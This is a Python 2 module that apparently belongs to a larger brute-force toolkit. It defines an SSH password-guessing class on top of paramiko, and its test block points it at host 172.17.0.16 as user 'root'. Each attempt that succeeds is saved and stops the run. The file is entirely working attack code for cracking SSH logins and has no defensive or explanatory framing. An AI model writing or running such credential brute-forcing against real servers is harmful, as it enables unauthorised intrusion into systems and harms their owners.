# -*- coding: UTF-8 -*-
import logging
import paramiko
import burp

class ssh_burp(burp.burp):
    def burp_thread(self,password,endSignal = False):
        if self.stop_signal:
            return None
        try:
            ssh = paramiko.SSHClient()
            ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
            ssh.connect(self.target,self.port,self.now_user,password)
            ssh.close()
            self.save(password)
            self.stop_signal = True
        except Exception,e:
            logging.error(e)
        if endSignal:
            self.stop_signal =True

if __name__ == '__main__':
    burp_test = ssh_burp()
    burp_test.init_target('172.17.0.16',22)
    burp_test.init_uspw(['1root'],['root'])
    burp_test.start_burp()
    burp_test.checkstate()